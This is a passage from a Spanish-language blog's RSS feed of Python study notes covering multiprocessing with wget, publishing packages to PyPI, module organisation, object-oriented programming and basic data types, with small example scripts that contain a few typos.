		process = multiprocessing.Process(target=make_wget, args=(url,))
		process.start()

		processes.append(process)

	for process in processes:
		process.join()

	end_time = time.time()
	print(f"\n\t[i] Time transcurred: {round(end_time - start_time,2)} s\n\n")


if __name__ == "__main__":
	print("\n\t[i] Initializing wgets without multiple processes:")
	wget_without_processes()
	print("\n\t[i] Initializing wgets with multiple processes:")
	wget_with_processes()
Copy<br>Tras ejecutar este script podremos comparar en tiempo real como se realizan las peticiones, sin el manejo de múltiples procesos se realizan de manera consecutiva mientras que haciendo uso de estos se realizan de forma simultanea, arrojando como resultado: <br><img alt="multiprocessing_python.png" src="https://dobliuw.com/lib/media/multiprocessing_python.png"><br>También podemos ver con comandos como ps -faux los procesos en tiempo real, de esta manera podremos visualizar que en el momento que comienza la ejecución del scrip con el apartado de multiprocessing se desprenderan subprocesos del procesos principal de ejecución: <br><img alt="multiprocessing_python_subprocesses.png" src="https://dobliuw.com/lib/media/multiprocessing_python_subprocesses.png">]]></description><link>https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/python/modules/threading-&amp;-multiprocessing-library.html</link><guid isPermaLink="false">Notes/5. Technologies/Lenguajes y Tools/Python/Modules/Threading &amp; multiprocessing library.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 26 Aug 2024 15:20:08 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/threading_python.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/threading_python.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[PyPI]]></title><description><![CDATA[ 
 <br><br>El Python Paxkage Index (PyPI) es el repositorio de software oficial para aplicaciones de terceros en el lenguaje de programación Python. Los desarrolladores de Python pretenden que sea un catálogo exhaustivo de todos los paquetes de Python escritos en código abiertoPyPI.<br><br><br>Antes de poder subir nuestros paquetes de código y módulos a PyPI es necesario comprender como se da la creación de paquetes en Python.<br><br>La estructura típica de un paquete podría incluir directorios para documentación, pruebas y el propio código, así como archios de configuración para la instalación y la distribución del paquete.<br>mkdir my_project &amp;&amp; cd my_project

mkdir package_name
touch README.md setup.py
Copy<br>Para dar comienzo a la estrucutra de los proyectos de software, solemos tener carpetas por cada paquete, siendo este el que contiene varios módulos. Por otro lado, archivos que podemos encontrarnos en proyectos suelen ser el README.md, archivo escrito en mark down que suele tener una descripción del uso y definición del proyecto; por otro lado el archivo setup.py, utilizado para poder configurar el proyecto para su release.<br>cd package_name
touch __init__.py
nano example.py
Copy<br>En este ejemplo, nos dirigimos a la carpeta previamente creada con el nombre de nuestro paquete (package_name en este caso) y creamos por un lado un archivo con nombre init.py, archivo el cual tendrá como finalidad permitirle a Python entender e inicializar el paquete, a su vez, este archivo suele utilizarse para facilitar la importación de módulos, debido a que si tenemos muchos paquetes y módulos para realizar la importación de ciertos módulos tendremos que aclarar el paquete.<br>
Por otro lado crearemos un modulo con un nombre que nos interese, en este ejemplo example.py, módulo el cual tendrá su respectivo código según lo que búsquemos, tanto declaraciones de funciones, clases, variables, etc.<br>De esta manera, teniendo en consideración el siguiente ejemplo de módulo, el contenido del archivo init.py podría ser el siguiente:<br>example.py<br>def example_fun():
	print("This is an example.")
Copy<br>__init__.py<br>from .example import *
Copy<br>De esta manera, si fuera de la carpeta "package_name" de nuestro paquete, importaramos la función example, podríamos hacerlo de la siguiente manera:<br>from package_name import example_fun
Copy<br>En caso de no contar con el archivo init.py, deberíamos realizar la importación de la siguiente manera:<br>from package_name.example import example_fun
Copy<br><br><br>Una vez entendido como se crean los paquetes y los módulos, podemos proseguir suponiendo que ya tenemos nuestro proyecto finalizado y simplemente queremos subirlo al Indexador de Paquetes de Python (PyPI) para que nuestro paquete este disponible y pueda ser instalado con pip por ejemplo, continuando con el ejemplo de proyecto llamado "my_project", con el comando pip3 install my_project.<br><br>Para poder subir un proyecto a la página de PyPI lo primero que tendremos que realizar es la creación de nuestra cuenta junto a la vinculación de la misma a nuestro número de telefono.<br><br>Una vez creada nuestra cuenta y logueados en ella, deberemos dirigirnos a la opción profile &gt; accounts settings &gt; API Tokens &gt; Add API token y le ingresamos un nombre seguido de crear el mismo.<br><br>Una vez que tengamos nuestra cuenta y el API token generado, procederemos a crear el archivo .pypirc en el directorio del usuario administrador.<br>sudo nano /root/.pypirc
Copy<br>.pypirc<br>[pypi]
	username = __token__
	password = {token_created_here}
Copy<br><br>Como se menciono en la parte de cración de paquetes, dentro de nuestro proyecto solemos crear un archivo llamado setup.py con la finalidad de poder configurar el proyecto para sus releases.<br>setup.py<br>from setuptools import setup, find_packages

with open("README.md", "r", encodigin="utf-8") as frm:
	long_description = frm.read()
	
setup(
	name="{proyect_name}",
	version="0.1.0",
	packages=find_packages(),
	install_requires=[],
	author="Dobliuw",
	description="{proyect_description}",
	long_description=long_description,
	long_description_content_type="text/markdown",
	url="{some_url_about_your_proyect}"
)
Copy<br>Una vez realizado todos estos pasos, solo quedaría subir nuestro proyecto:<br>pip3 install twine

python3 -m build

twine upload dist/* --verbose
Copy<br>Una vez realizado esto, en nuestro perfil de PyPI se subiria nuestro proyecto.]]></description><link>https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/python/crear-un-proyecto-en-pypi.html</link><guid isPermaLink="false">Notes/5. Technologies/Lenguajes y Tools/Python/Crear un proyecto en PyPI.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 12 Dec 2023 15:42:01 GMT</pubDate></item><item><title><![CDATA[Organización del código en módulos]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:tecnologías" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#tecnologías</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:tecnologías" class="tag" target="_blank" rel="noopener nofollow">#tecnologías</a>
<br><br><br>La organización del código en módulos es una práctica esencial en Python para construir programas escalables y mantenibles. Los módulos son archivos de Python que contiene definiciones y declaraciones de variables, funciones, clases u otros objetos que se pueden reutilizar en diferentes partes del programa.<br><br>Cada módulo en Python es un archivo .py que encapsula tu código para un propósito especifico. Por ejemplo, puedes tener un módulo para operaciones matemáticas, otro para manejo de entradas/salidas, y otro para la lógica de la interfaz de usuario. esta estrucutar ayuda a mantener el código organizado, facilita la lectura y hace posible reutilización de código.<br><br>Python utiliza la palabra clave import para utilizar módulos. Puedes importar un módulo comleto, como import math o importar nombres específicos de un módulo utilizando from math import sqrt. Python también permite la importación de módulos con una alias para facilitar su uso dentro del código, como import numpy as np.<br><br>Cuando los programas crece y los módulos comienzan a acumularse, Python permite organizar módulos en patquetes. Un paquete es una carpeta que contiene módulos y un archivo especial llamado init.py, que indica a Python que esa carpeta contiene módulos que pueden ser importados.<br>Ventajas de los Módulos<br>
<br>Mantenimiento: Los módulos permiten trabajar en partes del código de manera independiente sin afectar otras partes del sistema.
<br>Espacio de Nombres: Los módulos definen su propio espacio de nombres, lo que significa que puedes tener funciones o clases con el mismo nombre en diferentes módulos sin conlicto.
<br>Reutilización: El código escrito en módulos puede ser reutlizado en diferentes programas simplemente importándolos donde se necesite.
<br>Ejemplos de módulos:<br>operations.py<br>def sum(num1, num2):
	return num1 + num2

def rest(num1, num2):
	return num1 - num2
Copy<br>main.py<br>import operations as op

print(op.sum(42, 43)) # 85
Copy<br>
<br>Para listar los módulos integrados por python podríamos ejecutar import sys; print(sys.builtin_module_names).
<br>Para listar la ruta del sistema de un módulo instalado e importado, podríamos ejecutar import hashlib; print(hashlib.__file__).
<br><br>Algo muy común de ver en scrips de python, es una línea particular que pareciera dar comienzo (En la mayoria de casos) al flujo del script, la cual es if __name__ == "__main__":, esta línea tiene un significado muy importante de comprender relacionado a la importación de módulos.<br>
Cuando ejecutamos un módulo (Ya sea cuando lo importamos o cuando lo ejecutamos directamente), existe una variable (name) la cual cambia de valor según esto, en caso de que estemos importando el script, la variable obtendrá el valor de module, mientras que si ejecutamos el script directamente (python3 script.py) esta variable obtendrá el valor de __main__. Esto nos podría ser de vital importancia si quisieramos que un script adopte un cierto comportamiente de cara a si es ejecutado o importado. <br>Esto puede ser visto y entendido con el siguiente ejemplo.<br>example.py:<br>import module as m 
Copy<br>module.py:<br>#!/usr/bin/env python3
def only_main():
    print("This function will be executed only if this module is main.")

def always():
    print("This function will be executed if this module is not main.(Module)")

print(__name__)
if __name__ == "__main__":
    only_main()
else:
    always()
Copy<br>Teniendo estos scripts si ejecutaramos los siguientes comandos veríamos los siguientes outputs:<br>python3 example.py
# module
# This function will be executed if this module is not main.(Module)
python3 module.py
# __main__
# This function will be executed only if this module is main.
Copy]]></description><link>https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/python/organización-de-código-en-módulos.html</link><guid isPermaLink="false">Notes/5. Technologies/Lenguajes y Tools/Python/Organización de código en módulos.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:17 GMT</pubDate></item><item><title><![CDATA[POO en Python]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:tecnologías" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#tecnologías</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:tecnologías" class="tag" target="_blank" rel="noopener nofollow">#tecnologías</a>
<br><br><br>La Programación Orientada a Objetos (POO) es un paradigma de programacióin que utiliza objetos y clases en su enfoque central. Es una manera de estructurar y roganizar el código que refleja cómo los desarrolladores piensan sobre el mundo real y las entidades dentro de él.<br><br><br>El uso de self es uno de los aspectos más fundamentales y a la vez confusos para gente nueva en la POO en Python. Este identificador es crucial para entedner c+omo Python maneja los métodos y atributos dentro de sus clases y objetos<br><br>A nivel conceptual, self es una referencia al objeto actual dentro de la clase. Es el primer parámetro qeu se pasa a cualquier método de una clase Python A través de self, un método puede acceder y manipular los atributos del objeto y llamar a otros métodos dentro del mismo objeto. Es importante tener en cuenta que ya que no deja de ser un argumento, este puede recibir cualquier nombre, pero por conveción se suele encontrar como self. <br><br>Cuando se crea una nueva instancia de una clase (Objeto), Python pasa automáticamente la instancia recién creada como el primer arguemento al método init (Constructor) y a otros métodos definidos en la clase que tienen self como su primer parámetro. Esto es lo que permite que un método opere con datos específicos del objeto y no con datos de la clase en general o de otras instancias de la clase.<br><br>El concepto de self es importante en la POO ya que segura que los métodos y atributos se apliquen al objeto correcto. Sin self, no podríamos diferenciar entre las operaciones y datos de defirentes instancias de una clase.<br><br><br>Las clases son los fundamentos de la POO. Actúan como plantillas para la creación de objetos y definen atributos y comportamientos que los objetos creados a partir de ellas tendrán. En Python, una clase se define con la palabra clave 'class' y proporciona la estructura inicial para todo objeto que se derive de ella.<br><br>Un objeto es una instancia de una clase. Cada vez que se crea unobjeto, se está creadun una instancia que tiene su propio espacio de memoria y conjunto de valores para los atributos defínidos por su clase. Los objetos encapsulan datos y funciones juntos en una entidad discreta.<br><br>Los métodos de una instacia de clase son funciones que se definen dentro de una clase y solo pueden ser llamados por las instancias de esa clase. estos métodos son el mecanismo principal para interactuar con los objetos, permitiéndoles realizar operaciones o acciones, modifcar su estado o incluso interactuar con otros objetos.<br>Ejemplo:<br># Simple Class
class Person:
	def __init__(self, name, age):
		self.name = name
		self.age = age
	def presentation(self)
		print("Hi everyone! My name is {} and I've {} years old.".format(self.name, self.age))

dobliuw = Person("Dobliuw", 20)
dobliuw.presentation() # Hi everyone! My name is Dobliuw and I've 20 years old.
print(dobliuw.name) # Dobliuw
print(dobliuw.age) # 20
Copy<br><br><br><br>Los decoradores son una herramienta poderosa en Python que permite modificar el comportamiento de una función o método. Funcionan como "envoltorios", que agregan funcionalidad antes y después del método o función decorada, sin cambiar su código fuente. En POO, los decoradores son frecuentemente utilizados para agregar funcionalidades de manera dinámica a los métodos, como la sincornización de hilos, la memorización de resultados o la verificación de permisos.<br><br>Un método de clase es un método que está ligado a la clase y no a una instancia de la clase. Esto significa que el método puede ser llamado sobre la clase misma, ne lugar de sobre un objeto de la clase. Se definen utilizando el decorador '@classmethod' y su primer arguemtno es siempre una referencia a la clase, convencionalmente llamada 'cls'. Los métodos de clase son utilzados a menudo para definir métodos "factory" que pueden crear instancias de la clase de diferentes maneras.<br><br>Los métodos estáticos, definidos con el decorador '@staticmethod', no reciben una referencia implícita ni a la instancia (self) ni a la clase (cls). Son básicamente como funciones regulares, pero pertenecen al espacio de nombres de la clase. Son útiles cuando queremos realizar alguna funcionalidad que está relacionada con la clase, pero no requiere acceder a la instancia o a los atributos de la clase.<br>Ejemplos:<br># STATIC METHOD
# Class con decoradores y métodos
class Rectangulo
	def __init__(self, ancho, alto):
		self.ancho = ancho
        self.alto = alto

# El decorador property sirve para convertir en método en una "propiedad"
    @property 
	def area(self):
        return self.ancho * self.alto

# El metodo __str__ sirve para realizar y devolver una acción determinada al intentar mostrar el objeto.
    def __str__(self):
        return f"\n[+] Propiedades del rectangulo: [Ancho: {self.ancho}, Alto: {self.alto}]\n"

# El método __eq__ sirve para realizar y devolver una acción determinada al intentar comparar dos instancias de la clase (objetos).
    def __eq__(self, other):
        return self.ancho == other.ancho and self.alto == other.alto

rect1 = Rectangulo(20, 80)
rect2 = Rectangulo(20, 80)

print(f"\n[+] El área es {rect1.area}")
print(rect1)
print("Los rectangulos son iguales") if rect1 == rect2 else print("Los rectangulos NO son iguales")

###############################################################
# CLASS METHOD
# Clase con más métodos, variables y herencia
class Book:
	# Class vars
	best_seller_limit = 5000
	IVA = 0.3

	def __init__(self, title, author, price):
		self.title = title
		self.author = author
		self.price = price

	@staticmethod
	def best_seller(sells):
		return sells &gt; Book.best_seller_limit # Using a Class vars

# El decorador @classmethod suele usarse en casos de herencia donde pueden generarse conflictos entre operaciones o acciones que deban cambiar basandose en determinadas propiedades, variables o métodos repetidos entre las clases con cambios, en este ejemplo no sería el mismo IVA de un libro digital que uno físico.
	@classmethod
	def iva_price(cls, price):
		return price + price * cls.IVA

class DigitalBook(Book): # Nueva clase hereda métodos y propiedades de la otra
	IVA = 0.5 

first_book = Book("Hacking the World", "Dobliuw", 100)
first_book_digital = DigitalBook("Hacking the World D.V", "Dobliuw", 100)

print(Book.best_seller(6000)) # True
print("\n[+] The {} book price with IVA is {}".format(first_book.title, Book.iva_price(first_book.price)))
print("\n[+] The {} digital book prive with IVA is {}".format(first_book_digital.title, DigitalBook.iva_price(first_book_digital.price)))

#########################################################################

class Students:

    students = []
    age_limit = 18

    def __init__(self, name, age):
        self.name = name
        self.age = age

        Students.students.append({"name": name, "age": age})


    @staticmethod
    def list_students():
        print("\n[i] We've registered de following students:\n")
        for i, student in enumerate(Students.students):
            print("{}) Student {} with {} years old.".format(i + 1 , student["name"], student["age"]))
        print("\n")


    @staticmethod
    def older(age):
        return age &gt;= Students.age_limit


    @classmethod
    def create(cls, student, age):

        if cls.older(age):
            return cls(student, age)
        else:
            return f"\n[!] {student} is a minor."

Copy<br><br><br>La herencia y el polimorfismo son conceptos fundamentales en la POO que permiten la creación de una estructura de clase flexible y reutilizable.<br><br>Es un principio de la POO que permite a una clase heredar atributos y métodos de otra clase, conocida como su clase base o superclase. La herencia facilita la reutilización de código y la creación de una jerarquía de clases. Las subclases heredan las características de la superclase, lo que permite que se especialicen o modifíquen comportamientos existentes.<br><br>Este concepto se refiere a la habilidad de objetos de diferentes clases de ser tratados como instancias de una clase común. El polimorfismo permite que una función o método interactúe con objetos de defirentes clases y los trate como si fueran del mismo tipo, siempes y cuando compartan la misma interfaz o me´todo. Esto significa que el mismo método puede comportarse de manera diferentes en distintas clases, un concepto conocido como sobrecarga de métodos.<br>Ambos, la herencia y el polimordismo, son piedras angulares de la POOO y son ampliamente utilizados para diseñar sistemas que son fácilmente extensibles y mantenibles.<br>Ejemplo de Herencia: <br>class Animal:
		
	def __init__(self, name):
		self.name = name

	def talk(self):
		raise NotImplementedError("The subclasses should implement this method")

class Cat(Animal):
	def talk(self):
		return f"{self.name}: ¡Miau!"

  
class Dog(Animal):
	def talk(self):
		return f"{self.name}: ¡Guau!"

  
cat = Cat("Garfield")
dog = Dog("Karin")
animal = Animal("Bro")

print(cat.talk()) # "Garfield: ¡Miau!"
print(dog.talk()) # "Karin: ¡Guau!"
print(animal.talk()) # Error
Copy<br>Ejemplo de Polimorfismo:<br>class Animal:
		
	def __init__(self, name):
		self.name = name

	def talk(self):
		raise NotImplementedError("The subclasses should implement this method")


class Cat(Animal):
	def talk(self):
		super().talk() # Forzar a pasar por el método "talk" en la clase padre de la cual se hereda. (Ya que la misma fue reescribida en la clase que hereda)
		return "¡Miau!"

  
class Dog(Animal):
	def talk(self):
		return "¡Guau!"


def make_talk(obj): # Esta misma función actua diferente para diferentes clases.
	print(f"{obj.name}: {obj.talk()}")

cat = Cat("Garfield")
dog = Dog("Karin")
animal = Animal("Bro")

print(cat.talk()) # "Garfield: ¡Miau!"
print(dog.talk()) # "Karin: ¡Guau!"
print(animal.talk()) # Error
Copy<br><br><br>El encapsulamiento en la programación orientada a objetos (POO) maneja principalmente tres niveles de cisibilidad para los atributos y métodos de una clase: públicos, protegidos y privados. En Python, esta distinción se realiza mediante convenciones en la nomenclatura, más que a través de estrictas resticciones de acceso como en otros lenguajes.<br><br>Son accesibles desde cualquier parte del rpgorama y, por convención, no tienen un prefijo especial. Se espera qeu estos atributos sean parte de la interfaz permanente de la clase.<br>Ejemplo:<br>class Bank:
	def __init__(self, money):
		self.money = money
Copy<br><br>Se indiica con un único guion bajo al principio del nombre (Por ejemplo _atributo). Esto es solo una convención y no impide el acceso desde fuera de la clase, pero se entiende que estos atruibutos están protefidos y no deberían ser accesibles directamente, excepto dentro de la propia clase y en subclases.<br>Ejemplo:<br>class Bank:
	def __init__(self, money):
		self._money = money
Copy<br><br>En Python, los atributos privados se indican con un doble guion bajo al principio del nombre (Por ejemplo, __atributo). Esto activa un mecanismo de cambio de nombre conocido como name mangling, donde el i ntérprete de Python alter internamente el nombre del atributo para hacer más difícil su acceso desde fuera de la clase.<br>Ejemplo:<br>class Bank:
	def __init__(self, money):
		self.__money = money

# Para acceder a los atributos:
print(self._Bank__money)
Copy<br><br>Los métodos especiales en Python son tambie´n conocidos como métodos mágicos y son identificados por doble guion bajo al inicio y al final (metodo). Permiten a las clases en Python emular el comportamiento de los tipos incorporados y responder a operadores específicos. Por ejemplo, el método init se utiliza para inciializar una nueva instancia de una clase, str se invoca para una representación en forma de cadena legible del objeto y len devuelve la longitud del objeto.<br>Algunos de los métodos especiales importantes en POO son:<br>
<br>init(self, [....]): Inicializa una nueva instacia de la calse.
<br>str(self): Devuelve una representación en cadena de texto de lobjeto, invocado por la función str(obj) y print.
<br>repr(self): Devuelve una representación del objeto que debería, en teoría, ser una expresión válida de Python, invocado por la función repr(obj).
<br>eq(self, other): Define el comportamiento del operador de igualdad ==.
<br>it(self, other), le(self, other), gt(self, other), ge(self, other): Definene el comportamiento de los operadores de comparación (&gt;, &lt;, &gt;= y &lt;= respectivamente).
<br>add(self, other), sub(self, other), mul(self, other), etc: Definen el comportamiento de los operadores aritméticos (+, -, ***, etc ).
<br>Ejemplos:<br>class Box:
	def __init__(self, *items):
		self.items = list(items)

	def __len__(self):
		return len(self.items)

	def __getitem__(self, i):
		return self.items[i]

	def __call__(self):
		for i in self.items:
			print(f"{i})")

	def __add__(self, num):
		for i in self.items:
			num += i
		return num

box = Box(1,2,3,4,5,6,7,8,9,10)
print(len(box)) # 10
print(box[5]) # 6
box() # 1) 2) 3) 4) 5) 6) 7) 8) 9) 10)
print(box + 1) 

#######################################

class Contador:
	def __init__(self, num):
		self.limit = num
        

	def __iter__(self):
		self.count = 0
		return self

  
	def __next__(self):
		if self.count &lt; self.limit:
			self.count += 1
			return self.count
        else:
			raise StopIteration

cincuenta = Contador(50)

for i in cincuenta:
	print(i)
Copy<br><br><br>Estas son características poderosas de Python que mejoran significativamente la forma en la que podemos manjear y modificar el comportamiento de nuestras clases y funciones.<br><br>Los decoradores en Python son una forma elegante de moficiar las funciones o métodos. Se utilizan para extender o alterar el comportamiento de la función sin cambiar su código fuente. Un decorador es en sí mismo una función que toma otra función como argumento y devuelve una nueva función que, opcionalemnte, puede agregar alguna funcionalidad antes y después de la función original.<br><br>Las propiedades son un caso especial de decoradores que permiten a los desarrolladores añadir "getter", "setter" y "deleter" a los atributos de uan clase de manera elegante, controlando así el acceso y la modificación de los datos. En Python, esto se logra con el decorador "@property", que transforman un método para acceder a un atributo como si fuera un atributo público.<br><br>
<br>El getter obtiene el valor de un atributo manteniendo el encapsulamiento y permitiendo que se ejecute una lógica adicional durante el acceso.
<br>El setter establecel el valor de un atributo y puede incluir validación o procesamiento antes de que el cambio se refleje en el estado interno del objeto.
<br>El deleter puede ser utilizado para definir un comportamiento cuando un atributo es eliminado con del.
<br>Ejemplo de decoradores:<br>def decorator(fun):
	def envf():
		print("Before call function")
		fun()
		print("After call function")
	return envf    

@decorator
def say_hi():
	print("Hi from the \"say_hi\" function")

say_hi()
# Before call function
# Hi from the "say_hi" function
# After call function

####################################
import time

def cron(fn):
    def envf(num):
        print("Making a pause...")
        inicial = time.time()
        fn(num)
        final = time.time()
        print(f"Time transcurred in function {fn.__name__}: {round(final - inicial, 2)} seconds")
    return envf


def short_pause():
    time.sleep(1)

@cron
def custom_pause(num):
    time.sleep(num)

custom_pause(4)
# Making a puase...
# *sleep 4 seconds*
# Time transcurred in fucntion custom_pause: 4.0 seconds
Copy<br>Ejemplo de propiedades:<br>class Person:
	def __init__(self, name, age):
		self.name = name
		self._age = age

	@property
	def age(self):  # Getter
		return self._age

	@age.setter
	def age(self, age):   # Setter
		if age &gt; 0:
			self._age = age
		else
			raise ValueError("This operation couldn't be completed.")

dobliuw = Person("Dobliuw", 20)
dobliuw._age = 18 # This is WRONG TOO!!!!
# Getter
dobliuw.age  # This is RIGHT!!!!
# Setter
dobliuw.age = 18  # This is RIGHT!!!!
Copy<br>Ejemplo de manejo de argumentos en funciones: <br>def suma(*args):
    return sum(args)

def presentation(**kvargs):
    for key, value in kvargs.items():
        print("Key {} have value {}".format(key, value))


print(suma(1, 5, 23, 54, 2, 54, 562, 54, 235))
presentation(name="Dobliuw", age=20, job="Hacker")
Copy]]></description><link>https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/python/poo-en-python.html</link><guid isPermaLink="false">Notes/5. Technologies/Lenguajes y Tools/Python/POO en Python.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Sun, 03 Dec 2023 02:28:26 GMT</pubDate></item><item><title><![CDATA[Python]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:tecnologías" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#tecnologías</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:tecnologías" class="tag" target="_blank" rel="noopener nofollow">#tecnologías</a>
<br><br><br>Python es un lenguaje de programación de alto nivel, interpretado, de propósito general y de sintexis clara y sencilla. Este se ha convertido en uno de los lenguajes de programación más utilizados en el mundo para diversas ramas y tareas, algunas de las características claves de Python son:<br>
<br>Lenguaje de Alto Nivel: Esto quiere decir que está diseñado para ser fácil de leer yescribir. 
<br>Interpretado: Python es un lenguaje interpretado, lo que significa que no se compila directamente a c´dogio máquina. en cambio, el código fuente se ejecuta directamente por un intérprete.
<br><br><br>El intérprete de Python es el programa que ejecuta el código fuente de Python. Hay varios intérpretes de Python disponibles, pero el intérprete oficial es CPython, que está escrito en C. <br><br><br>Las convenciones de programación son reglas o pautas que los programadores adoptan para escribir código de manera consistente y legible. Estas convenciones no son necesariamente reglas impuestas por el lenguaje de programación en sí, sino más bien prácticas recomendaddas que la comunidad de programadores ha acordado seguir. Cada lenguaje de programación puede tener diferentes convenciones, tanto para la declaración de variables, funciones, arrays, etc. En este caso claramente Python no es la exepción y cuenta con sus propias convenciones. Algunas de ellas son: <br>
<br>Snake Case en la Declaración de funciones: A la hora de declarar funciones en python, existe una convención la cual recomienda la declaración de los nombres de funciones con la técnica de snake_case. 
<br>Uper Camel Case en la Declaración de Clases y Manejo de Exepciones: En este caso al igual que en la declaración de funciones, para la declaración de clases se recomienda la declaración de los nombres de las mismas con la técnica de UpperCamelCase.
<br>Screaming Snake Case en la Declaración de Constantes: Para la declaración de constantes, teniendo en cuenta que de por si en Python las constantes no existen, existe en su lugar una convención para entender que las constantes serán variables con nombres en SCREAMING_SNAKE_CASE.
<br><br><br><br>Existen múltiples tipos de datos que serán utilizados a lo largo de muchos lenguajes de programación, en el caso de Python, no tratandose de una exepción, contamos con varios tipos de datos.<br>
<br>Strings (Cadenas): Las cadenas son secuencias de caracteres que se utilizan para manejar texto. Son inmutables, lo que significa que una vez creadas, no puedes cambiar sus caracteres individuales.
<br>Integers (Enteros): Números sin parte decimal.
<br>Floats (Flotantes): Números que incluyen decimales.
<br><br>Como sabemos, las operaciones son funciones matemáticas sobre tuplas que obtienen un resultado, aplicando unas reglas preestablécidas sobre la tupla.<br>
<br>Suma ( + ) 
<br>Resta ( - )
<br>Multiplicación ( * )
<br>División ( / )
<br>Módulo ( % )
<br>Es importante tener en cuenta que algunas operaciones se pueden dar con otros tipos de datos y no únicamente con integers o floats, si no también pueden ser vistos con strings y listas. <br>Ejemplo<br># Strings
string1 = "Dobliuw"
string2 = "Dumb"

new_string = string1 + " " + string2 # "Dobliuw Dumb"
new_string2 = string2 * 3 # "DumbDumbDumb"

# Lists / Arrays
arr1 = [1, 2, 3, 4, 5]
arr2 = [6, 7, 8, 9, 10]

new_arr = arr1 + arr2 # [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
Copy<br>En caso de hacer manejo de números muy grandes, es importante tener en cuenta que se pueden aplicar formateos para dar mayor legibilidad a la hora de leer e interpretar los valores obtenidos como resultado de determinadas operaciones.<br>Ejemplo:<br>x = 12
y = 7
z = x ** y

print(f"{:,}".format(z).replace(",", ".")) # 35.831.808
Copy<br><br>Una variable es un espacio en memoria representado con un nombre personalizado en el cual podemos alojar datos de todo tipo para consultarlos en otro momento del programa.<br>Ejemplos:<br>name = "Dobliuw" # Str
age = 20 # Int
hobbies = ["Skate", "Hacking", "Gaming"] # List
person = {"name": "Dobliuw", "age": 20} # Dictionary
Copy<br><br>Las listas son estructuras de datos que nos permiten almacenar secuencias ordenadas de elementos. Son mutables, lo que significa que podemos modificarlas después de su creación, y son dinámicas, permitiéndonos añadir o quitar elementos de ellas. Algunas de las características más claves de las listas en Python son:<br>
<br>Almacenar datos heterogéneos, es decir, pueden contener elementos de diferentes tipos (enteros, cadenas, flotantes y más) dentro de una misma lista.
<br>Ser indexadas y crotadas, lo que permite acceder a elementos específicos de la lista directamente a través de su índice.
<br>Ser anidadas, es decir, una listar puede contener otras listas como elementos, lo que permite crear estrucutras de datos complejas como matrices.
<br><br>También cubriremos las operaciones fundamentales que se pueden realizar con listas, como:<br>
<br>Añadir elementos con métodos como append() y extend(). 
<br>Eliminar elementos con métodos como remove() y pop().
<br>Ordenar las listas con el método sort() o la función incorporada sorted().
<br>Invertir los elementos con el método reverse() o la sintaxis de corte [::-1].
<br>Comprender las comprensiones de listas, una forma pythonica de crear y manipular listas de manera concisa y eficiente.
<br>Ejemplo:<br>attacks = ["DDoS", "SQL Injection", "Deserialization Attack", "NOSQL Injection", "Cross-Site Scripting", "Server-Side Request Forgery"]
attacks.append("Server Side Template Injection") 
#  ["DDoS", "SQL Injection", "Deserialization Attack", "NOSQL Injection", "Cross-Site Scripting", "Server-Side Request Forgery", "Server Side Template Injection"]
attacks.insert(2, "Client Side Template Injection")
#  ["DDoS", "SQL Injection", "Client Side Template Injection", "Deserialization Attack", "NOSQL Injection", "Cross-Site Scripting", "Server-Side Request Forgery", "Server Side Template Injection"]

attacks[1:4] # ["SQL Injection", "Client Side Template Injection", "Deserialization Attack", ]
attacks.sort() 
# ['Client Side Template Injection', 'Cross-Site Scripting', 'DDoS', 'Deserialization Attack', 'NOSQL Injection', 'SQL Injection', 'Server Side Template Injection', 'Server-Side Request Forgery']
attacks.reverse() # attacks[::-1]
# ['Server-Side Request Forgery', 'Server Side Template Injection', 'SQL Injection', 'NOSQL Injection', 'Deserialization Attack', 'DDoS', 'Cross-Site Scripting', 'Client Side Template Injection']
Copy<br><br>Las tuplas son colecciones ordenadas de elementos que no pueden modificarse una vez creadas. esta característica las hace ideales para asegurar que ciertos datos permanezcan constantes a lo largo del ciclo de vida de un programa. Alguna de las características claves de las tuplas en Python son:<br>
<br>Inmutabilidad: Una vez que se crea una tupla, no puedes cambiar, añadir o eliminar elementos. Esta inmutabiliidad garantiza la integridad de los datos que desea mantener constantes.
<br>Indezación y Slicing: Al igual que las listas, puede acceder a los elemntos de la tupla mediante índices y también puedes realizar operaciones de slicing para obtener subsecuencias de la tupla.
<br>Heterogeneidad: Las tuplas pueden contener elementos de diferentes tipos, incluyendo otras tuplas, lo que las have muy versátiles.
<br><br>Si bien sabemos que estas no se pueden modificar, existen múltiples operaciones que se pueden llevar a cabo con estos elementos:<br>
<br>Empaquetado y Desempaquetado de Tuplas: Las tuplas permiten asignar y desasignar sus elementos a múltiples variables de forma simultánea.
<br>Concatenación y Repetición: Similar a las listas, puedes combinar tuplas usando el operador + y repetir los elementos de una tupla un número de terminado de veces con el operador *.
<br>Métodos de Búsqueda: Puedes usar  métodos como index() para encontrar la posición de un elemento y count() para contar cuántas veces aparece un elemento en la tupla.
<br><br>De cara al uso que se le puede dar a estos elementos es importante destacar los siguientes casos de uso:<br>
<br>Funciones y Asignaciones Múltiples: Las tuplas son muy útiles cuando una función necesita devolver múltiples valores o cuando se realizan asignaciones múltiples en una sola línea.
